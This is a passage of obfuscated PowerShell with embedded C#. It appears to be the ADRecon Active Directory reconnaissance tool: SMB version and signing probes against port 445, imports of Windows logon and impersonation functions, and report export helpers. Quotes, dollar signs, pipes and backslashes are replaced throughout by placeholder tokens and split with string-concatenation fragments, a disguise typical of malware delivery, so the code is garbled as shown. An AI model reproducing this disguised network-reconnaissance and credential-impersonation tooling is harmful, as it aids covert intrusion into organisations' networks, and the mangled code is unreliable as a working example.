			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine(lEzjChecking lEzj + server + lEzj for SMBV1 dialect lEzj + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception(lEzjport 445 is closed on lEzj + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine(lEzjChecking lEzj + server + lEzj for SMBV1 dialect lEzj + dialect + lEzj = SupportedlEzj);
					return true;
				}
				Trace.WriteLine(lEzjChecking lEzj + server + lEzj for SMBV1 dialect lEzj + dialect + lEzj = Not supportedlEzj);
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException(lEzjSmb1 is not supported on lEzj + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine(lEzjChecking lEzj + server + lEzj for SMBV2 dialect 0xlEzj + dialect.ToString(lEzjX2lEzj));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception(lEzjport 445 is closed on lEzj + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] '+'negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 0Ogv0Ogv smbHeader[9] != 0 0Ogv0Ogv smbHeader[10] != 0 0Ogv0Ogv smbHeader[11] != 0)
				{
					Trace.WriteLine(lEzjChecking lEzj + server + lEzj for SMBV2 dialect 0xlEzj + dialect.ToString(lEzjX2lEzj) + lEzj = Not supported via error codelEzj);
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine(lEzjChecking lEzj + server + lEzj for SMBV2 SMB Signing dialect 0xlEzj + dialect.ToString(lEzjX2lEzj) + lEzj = SupportedlEzj);
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine(lEzjChecking lEzj + server + lEzj for SMBV2 dialect 0xlEzj + dialect.ToString(lEzjX2lEzj) + lEzj = SupportedlEzj);
					return true;
				}
				Trace.WriteLine(lEzjChecking lEzj + server + lEzj for SMBV2 dialect 0xlEzj + dialect.ToString(lEzjX2lEzj) + lEzj = Not supported via not returned dialectlEzj);
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException(lEzjSmb2 is not supported on lEzj + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, lEzjNT LM 0.12lEzj);
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) 0Ogv0Ogv DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) 0Ogv0Ogv DoesServerSupportDialectWithSmbV2(server, 0x0302, false) 0Ogv0Ogv DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return lEzjsmblEzj; } }
		public static PSObject GetPSObject(Object IPv4Address)
		{
            string computer = Convert.ToString(IPv4Address);
            PSObject DCSMBObj = new PSObject();
            if (computer == lEzjlEzj)
            {
                DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB Port OpenlEzj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB1(NT LM 0.12)lEzj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB2(0x0202)lEzj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB2(0x0210)lEzj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0300)lEzj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0302)lEzj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0311)lEzj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB SigninglEzj, null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, lEzjNT LM 0.12lEzj);
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
				SMBSigning = DoesServerSupportDialectWithS'+'mbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB Port OpenlEzj, isPortOpened));
            DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB1(NT LM 0.12)lEzj, SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB2(0x0202)lEzj, SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB2(0x0210)lEzj, SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0300)lEzj, SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0302)lEzj, SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0311)lEzj, SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB SigninglEzj, SMBSigning));
            return DCSMBObj;
		}
	}
}
lEzj@

# Import the LogonUser, ImpersonateLoggedOnUser and RevertToSelf Functions from advapi32.dll and the CloseHandle Function from kernel32.dll
# https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Utility/Add-Type?view=powershell-5.1
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa379317(v=vs.85).aspx

bLHAdvapi32Def = @xfJ4
    [DllImport(lEzjadvapi32.dlllEzj, SetLastError = true)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToke'+'n);

    [DllImport(lEzjadvapi32.dlllEzj, SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport(lEzjadvapi32.dlllEzj, SetLastError = true)]
    public static extern bool RevertToSelf();
xfJ4@

# https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx

bLHKernel32Def = @xfJ4
    [DllImport(lEzjkernel32.dlllEzj, SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
xfJ4@

Function Get-DateDiff
{
<#
.SYNOPSIS
    Get difference between two dates.

.DESCRIPTION
    Returns the difference between two dates.

.PARAMETER Date1
    [DateTime]
    Date

.PARAMETER Date2
    [DateTime]
    Date

.OUTPUTS
    [System.ValueType.TimeSpan]
    Returns the difference between the two dates.
#>
    param (
        [Parameter(Mandatory = bLHtrue)]
        [DateTime] bLHDate1,

        [Parameter(Mandatory = bLHtrue)]
        [DateTime] bLHDate2
    )

    If (bLHDate2 -gt bLHDate1)
    {
        bLHDDiff = bLHDate2 - bLHDate1
    }
    Else
    {
        bLHDDiff = bLHDate1 - bLHDate2
    }
    Return bLHDDiff
}

Function Get-DNtoFQDN
{
<#
.SYNOPSIS
    Gets Domain Distinguished Name (DN) from the Fully Qualified Domain Name (FQDN).

.DESCRIPTION
    Converts Domain Distinguished Name (DN) to Fully Qualified Domain Name (FQDN).

.PARAMETER ADObjectDN
    [str'+'ing]
    Domain Distinguished Name (DN)

.OUTPUTS
    [String]
    Returns the Fully Qualified Domain Name (FQDN).

.LINK
    https://adsecurity.org/?p=440
#>
    param(
        [Parameter(Mandator'+'y = bLHtrue)]
        [string] bLHADObjectDN
    )

    bLHIndex = bLHADObjectDN.IndexOf(xfJ4DC=xfJ4)
    If (bLHIndex)
    {
        bLHADObjectDNDomainName = bLH(bLHADObjectDN.SubString(bLHIndex)) -replace xfJ4DC=xfJ4,xfJ4xfJ4 -replace xfJ4,xfJ4,xfJ4.xfJ4
    }
    Else
    {
        # Modified version from https://adsecurity.org/?p=440
        [array] bLHADObjectDNArray = bLHADObjectDN -Split (lEzjDC=lEzj)
        bLHADObjectDNArray 0Ogv ForEach-Object {
            [array] bLHtemp = bLH_ -Split (lEzj,lEzj)
            [string] bLHADObjectDNArrayItemDomainName += bLHtemp[0] + lEzj.lEzj
        }
        bLHADObjectDNDomainName = bLHADObjectDNArrayItemDomainName.Substring(1, bLHADObjectDNArrayItemDomainName.Length - 2)
    }
    Return bLHADObjectDNDomainName
}

Function Export-ADRCSV
{
<#
.SYNOPSIS
    Exports Object to a CSV file.

.DESCRIPTION
    Exports Object to a CSV file using Export-CSV.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the CSV File.

.OUTPUTS
    CSV file.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [ValidateNotNullOrEmpty()]
        [PSObject] bLHADRObj,

        [Parameter(Mandatory = bLHtrue)]
        [ValidateNotNullOrEmpty()]
        [String] bLHADFileName
    )

    Try
    {
        bLHADRObj 0Ogv Export-Csv -Path bLHADFileName -NoTypeInformation -Encoding Default
    }
    Catch
    {
        Write-Warning lEzj[Export-ADRCSV] Failed to export bLH(bLHADFileName).lEzj
        Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
    }
}

Function Export-ADRXML
{
<#
.SYNOPSIS
    Exports Object to a XML file.

.DESCRIPTION
    Exports Object to a XML file using Export-Clixml.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the XML File.

.OUTPUTS
    XML file.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [ValidateNotNullOrEmpty()]
        [PSObject] bLHADRObj,

        [Parameter(Mandatory = bLHtrue)]
        [ValidateNotNullOrEmpty()]
        [String] bLHADFileName
    )

    Try
    {
        (ConvertTo-Xml -NoTypeInformation -InputObject bLHADRObj).Save(bLHADFileName)
    }
    Catch
    {
        Write-Warning lEzj[Export-ADRXML] Failed to export bLH(bLHADFileName).lEzj
        Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
    }
}

Function Export-ADRJSON
{
<#
.SYNOPSIS
    Exports Object to a JSON file.

.DESCRIPTION
    Exports Object to a JSON file using ConvertTo-Json.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the JSON File.

.OUTPUTS
    JSON file.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [ValidateNotNullOrEmpty()]
        [PSObject] bLHADRObj,

        [Parameter(Mandatory = bLHtrue)]
        [ValidateNotNullOrEmpty()]
        [String] bLHADFileName
    )

    Try
    {
        ConvertTo-JSON -InputObject bLHADRObj 0Ogv Out-File -FilePath bLHADFileName
    }
    Catch
    {
        Write-Warning lEzj[Export-ADRJSON] Failed to export bLH(bLHADFileName).lEzj
        Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
    }
}

Function Export-ADRHTML
{
<#
.SYNOPSIS
    Exports Object to a HTML file.

.DESCRIPTION
    Exports Object to a HTML file using ConvertTo-Html.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the HTML File.

.OUTPUTS
    HTML file.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [ValidateNotNull'+'OrEmpty()]
        [PSObject] bLHADRObj,

        [Parameter(Mandatory = bLHtrue)]
        [ValidateNotNullOrEmpty()]
        [String] bLHADFileName,

        [Parameter(Mandatory = bLHfalse)]
        [String] bLHADROutputDir = bLHnull
    )

bLHHeader = @lEzj
<style type=lEzjtext/csslEzj>
th {
	color:white;
	background-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	ma'+'rgin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
lEzj@
    Try
    {
        If (bLHADFileName.Contains(lEzjIndexlEzj))
        {
            bLHHTMLPath  = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4HTML-FilesxfJ4)
            bLHHTMLPath = bLH((Convert-Path bLHHTMLPath).TrimEnd(lEzjcnIlEzj))
            bLHHTMLFiles = Get-ChildItem -Path bLHHTMLPath -name
            bLHHTML = bLHHTMLFiles 0Ogv ConvertTo-HTML -Title lEzjADReconlEzj -Property @{Label=lEzjTable of ContentslEzj;Expression={lEzj<a href=xfJ4bLH(bLH_)xfJ4>bLH(bLH_)</a>lEzj}} -Head bLHHeader

            Add-Type -AssemblyName System.Web
            [System.Web.HttpUtility]::HtmlDecode(bLHHTML) 0Ogv Out-File -FilePath bLHADFileName
        }
        Else
        {
            If (bLHADRObj -is [array])
            {
                bLHADRObj 0Ogv Select-Object * 0Ogv ConvertTo-HTML -As Table -Head bLHHeader 0Ogv Out-File -FilePath bLHADFileName
    '+'        }
            Else
            {
                ConvertTo-HTML -InputObject bLHADRObj -As Table -H'+'ead bLHHeader 0Ogv Out-File -FilePath bLHADFileName
            }
        }
    }
    Catch
    {
        Write-Warning lEzj[Export-ADRHTML] Failed to export bLH(bLHADFileName).lEzj
'+'        Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
    }
}

Function Export-ADR
{
<#
.SYNOPSIS
    Helper function for all output types supported.

.DESCRIPTION
    Helper function for all output types supported.

.PARAMETER ADObjectDN
    [PSObject]
    ADRObj

.PARAMETER ADROutputDir
    [String]
    Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.

.PARAMETER ADRModuleName
    [String]
    Module Name.

.OUTPUTS
    STDOUT, CSV, XML, JSON and/or HTML file, etc.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [PSObject] bLHADRObj,

        [Parameter(Mandatory = bLHtrue)]
        [String] bLHADROutputDir,

        [Parameter(Mandatory = bLHtrue)]
        [array] bLHOutputType,

        [Parameter(Mandatory = bLHtrue)]
        [String] bLHADRModuleName
    )

    Switch (bLHOutputType)
    {
        xfJ4STDOUTxfJ4
        {
            If (bLHADRModuleName -ne lEzjAboutADReconlEzj)
            {
                If (bLHADRObj -is [array])
                {
                    # Fix for InvalidOperationException: The object of type lEzjMicrosoft.PowerShell.Commands.Internal.Format.FormatStartDatalEzj is not valid or not in the correct sequence.
                    bLHADRObj 0Ogv Out-String -Stream
                }
                Else
                {
                    # Fix for InvalidOperationException: The object of type lEzjMicrosoft.PowerShell.Commands.Internal.Format.FormatStartDatalEzj is not valid or not in the correct sequence.
                    bLHADRObj 0Ogv Format-List 0Ogv Out-String -Stream
                }
            }
        }
        xfJ4CSVxfJ4
        {
            bLHADFileName  = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4CSV-FilesxfJ4,xfJ4cnIxfJ4,bLHADRModuleName,xfJ4.csvxfJ4)
            Export-ADRCSV -ADRObj bLHADRObj -ADFileName bLHADFileName
        }
        xfJ4XMLxfJ4
        {
            bLHADFileName  = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4XML-FilesxfJ4,xfJ4cnIxfJ4,bLHADRModuleName,xfJ4.xmlxfJ4)
            Export-ADRXML -ADRObj bLHADRObj -ADFileName bLHADFileName
        }
        xfJ4JSONxfJ4
        {
            bLHADFileName  = -join(bLHADROutputDi'+'r,xfJ4cnIxfJ4,xfJ4JSON-FilesxfJ4,xfJ4cnIxfJ4,bLHADRModuleName,xfJ4.jsonxfJ4)
            Export-ADRJSON -ADRObj bLHADRObj -ADFileName bLHADFileName
        }
        xfJ4HTMLxfJ4
        {
            bLHADFileName  = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4HTML-FilesxfJ4,xfJ4cnIxfJ4,bLHADRModuleName,xfJ4.htmlxfJ4)
            Export-ADRHTML -ADRObj bLHADRObj -ADFileName bLHADFileName -ADROutputDir bLHADROutputDir
        }
    }
}

Function Get-ADRExcelComObj
{
<#
.SYNOPSIS
    Creates a ComObject to interact with Microsoft Excel.

.DESCRIPTION
    Creates a ComObject to interact with Microsoft Excel if installed, else warning is raised.

.OUTPUTS
    [System.__ComObject] and [System.MarshalByRefObject]
    Creates global variables bLHexcel and bLHworkbook.
#>

    #Check if Excel is installed.
    Try
    {
        # Suppress verbose output
        bLHSaveVerbosePreference = bLHscript:VerbosePreference
        bLHscript:VerbosePreference = xfJ4SilentlyContinuexfJ4
        bLHglobal:excel = New-Object -ComObject excel.application
        If (bLHSaveVerbosePreference)
        {
            bLHscript:VerbosePreference = bLHSaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
    }
    Catch
    {
        If (bLHSaveVerbosePreference)
        {
            bLHscript:VerbosePreference = bLHSaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
        Write-Warning lEzj[Get-ADRExcelComObj] Excel does not appear to be installed. Skipping generation of ADRecon-Report.xlsx. Use the -GenExcel parameter to generate the ADRecon-Report.xslx on a host with Microsoft Excel installed.lEzj
        Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        Return bLHnull
    }
    bLHexcel.Visible = bLHtrue
    bLHexcel.Interactive = bLHfalse
    bLHglobal:workbook = bLHexcel.Workbooks.Add()
    If (bLHworkbook.Worksheets.Count -eq 3)
    {
        bLHworkbook.WorkSheets.Item(3).Delete()
        bLHworkbook.WorkSheets.Item(2).Delete()
    }
}

Function Get-ADRExcelComObjRelease
{
<#
.SYNOPSIS
    Releases the ComObject created to interact with Microsoft Excel.

.DESCRIPTION
    Releases the ComObject created to interact with Microsoft Excel.

.PARAMETER ComObjtoRelease
    ComObjtoRelease

.PARAMETER Final
    Final
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        bLHComObjtoRelease,

        [Parameter(Mandatory = bLHfalse)]
        [bool] bLHFinal = bLHfalse
    )
    # https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.releasecomobject(v=vs.110).aspx
    # https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.finalreleasecomobject(v=vs.110).aspx
    If (bLHFinal)
    {
        [System.Runtime.InteropServices.Marshal]::FinalReleaseComObject(bLHComObjtoRelease) 0Ogv Out-Null
    }
    Else
    {
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject(bLHComObjtoRelease) 0Ogv Out-Null
    }
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}

Function Get-ADRExcelWorkbook
{
<#
.SYNOPSIS
    Adds a WorkSheet to the Workbook.

.DESCRIPTION
    Adds a WorkSheet to the Workbook using the bLHworkboook global variable and assigns it a name.

.PARAMETER name
    [string]
    Name of the WorkSheet.
#>
    param (
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHname
    )

    bLHworkbook.Worksheets.Add() 0Ogv Out-Null
    bLHworksheet = bLHworkbook.Worksheets.Item(1)
    bLHworksheet.Name = bLHname

    Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelImport
{
<#
.SYNOPSIS
    Helper to import CSV to the current WorkSheet.

.DESCRIPTION
    Helper to import CSV to the current WorkSheet. Supports two methods.

.PARAMETER ADFileName
    [string]
    Filename of the CSV file to import.

.PARAMETER method
    [int]
    Method to use for the import.

.PARAMETER row
    '+'[int]
    Row.

.PARAMETER column
    [int]
    Column.
#>
    param (
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHADFileName,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHMethod = 1,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHrow = 1,

        [Parameter(Mandator'+'y = bLHfalse)]
        [int] bLHcolumn = 1
    )

    bLHexcel.ScreenUpdating = bLHfalse
    If (bLHMethod -eq 1)
    {
        If (Test-Path bLHADFileName)
        {
            bLHworksheet = bLHworkbook.Worksheets.Item(1)
            bLHTxtConnector = (lEzjTEXT;lEzj + bLHADFileName)
            bLHCellRef = bLHworksheet.Range(lEzjA1lEzj)
            #Build, use and remove the text file connector
            bLHConnector = bLHworksheet.QueryTables.add(bLHTxtConnector, bLHCellRef)

            #65001: Unicode (UTF-8)
            bLHworksheet.QueryTables.item(bLHConnector.name).TextFilePlatform = 65001
            bLHworksheet.QueryTables.item(bLHConnector.name).TextFileCommaDelimiter = bLHTrue
            bLHworkshe'+'et.QueryTables.item(bLHConnector.name).TextFileParseType = 1
            bLHworksheet.'+'QueryTables.item(bLHConnector.name).Refresh() 0Ogv Out-Null
            bLHworksheet.QueryTables.item(bLHConnector.name).delete()

            Get-ADRExcelComObjRelease -ComObjtoRelease bLHCellRef
            Remove-Variable CellRef
            Get-ADRExcelComObjRelease -ComObjtoRelease bLHConnector
            Remove-Variable Connector

            bLHlistObject = bLHworksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.X'+'lListObjectSourceType]::xlSrcRange, bLHworksheet.UsedRange, bLHnull, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, bLHnull)
            bLHlistObject.TableStyle = lEzjTableStyleLight2lEzj # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            bLHworksheet.UsedRange.EntireColumn.AutoFit() 0Ogv Out-Null
        }
        Remove-Variable ADFileName
    }
    Elseif (bLHMethod -eq 2)
    {
        bLHworksheet = bLHworkbook.Worksheets.Item(1)
        If (Test-Path bLHADFileName)
        {
            bLHADTemp = Import-Csv -Path bLHADFileName
            bLHADTemp 0Ogv ForEach-Object {
                Foreach (bLHprop in bLH_.PSObject.Properties)
                {
                    bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = bLHprop.Name
                    bLHworksheet.Cells.Item(bLHrow, bLHcolumn + 1) = bLHprop.Value
                    bLHrow++
                }
            }
            Remove-Variable ADTemp
            bLHlistObject = bLHworksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourc'+'eType]::xlSrcRange, bLHworksheet.UsedRange, bLHnull, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, bLHnull)
            bLHlistObject.TableStyle = lEzjTableStyleLight2lEzj # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            bLHusedRange = bLHworksheet.UsedRange
            bLHusedRange.EntireColumn.AutoFit() 0Ogv Out-Null
        }
        Else
        {
            bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = lEzjError!lEzj
        }
        Remove-Variable ADFileName
    }
    bLHexcel.ScreenUpdating = bLHtrue

    Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
    Remove-Variable worksheet
}

# Thanks Anant Sh'+'rivastava for the suggestion of using Pivot Tables for generation of the Stats sheets.
Function Get-ADRExcelPivotTable
{
<#
.SYNOPSIS
    Helper to add Pivot Table to the current WorkSheet.

.DESCRIPTION
    Helper to add Pivot Table to the current WorkSheet.

.PARAMETER SrcSheetName
    [string]
    Source Sheet Name.

.PARAMETER PivotTableName
    [string]
    Pivot Table Name.

.PARAMETER PivotRows
    [array]
    Row names from Source Sheet.

.PARAMETER PivotColumns
    [array]
    Column names from Source Sheet.

.PARAMETER PivotFilters
    [array]
    Row/Column names from Source Sheet to use as filters.

.PARAMETER PivotValues
    [array]
    Row/Column names from Source Sheet to use for Values.

.PARAMETER PivotPercentage
    [array]
    Row/Column names from Source Sheet to use for Percentage.

.PARAMETER PivotLocation
    [array]
    Location of the Pivot Table in Row/Column.
#>
    param (
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHSrcSheetName,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHPivotTableName,

        [Parameter(Mandatory = bLHfalse)]
        [array] bLHPivotRows,

        [Parameter(Mandatory = bLHfalse)]
        [array] bLHPivotColumns,

        [Parameter(Mandatory = bLHfalse)]
        [array] bLHPivotFilters,

        [Parameter(Mandatory = bLHfalse)]
        [array] bLHPivotValues,

        [Parameter(Mandatory = bLHfalse)]
        [array] bLHPivotPercentage,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHPivotLocation = lEzjR1C1lEzj
    )

    bLHexcel.ScreenUpdating = bLHfalse
    bLHSrcWorksheet '+'= bLHworkbook.Sheets.Item(bLHSrcSheetName)
    bLHworkbook.ShowPivotTableFieldList = bLHfalse

    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivottablesourcetype-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivottableversionlist-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivotfieldorientation-enumeration-exce'+'l
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/constants-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivotfiltertype-enumeration-excel

    # xlDatabase = 1 # this just means local sheet data
    # xlPivotTableVersion12 = 3 # Excel 2007
    bLHPivotFailed = bLHfalse
    Try
    {
        bLHPivotCaches = bLHworkbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, bLHSrcWorksheet.UsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
    }
    Catch
    {
        bLHPivotFailed = bLHtrue
        Write-Verbose lEzj[PivotCaches().Create] FailedlEzj
        Write-Verbose lEzj[EXCEPTION] bLH(bLH_.E'+'xception.Message)lEzj
    }
    If ( bLHPivotFailed -eq bLHtrue )
    {
        bLHrows = bLHSrcWorksheet.UsedRange.Rows.Count
        If (bLHSrcSheetName -eq lEzjComputer SPNslEzj)
        {
            bLHPivotCols = lEzjA1:ClEzj
        }
        ElseIf (bLHSrcSheetName -eq lEzjComputerslEzj)
        {
            bLHPivotCols = lEzjA1:FlEzj
        }
        ElseIf (bLHSrcSheetName -eq lEzjUserslEzj)
        {
            bLHPivotCols = lEzjA1:ClEzj
        }
        bLHUsedRange = bLHSrcWorksheet.Range(bLHPivotCols+bLHrows)
        bLHPivotCaches = bLHworkbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, bLHUsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
        Remove-Variable rows
	    Remove-Variable PivotCols
        Remove-Variable UsedRange
    }
    Remove-Variable PivotFailed
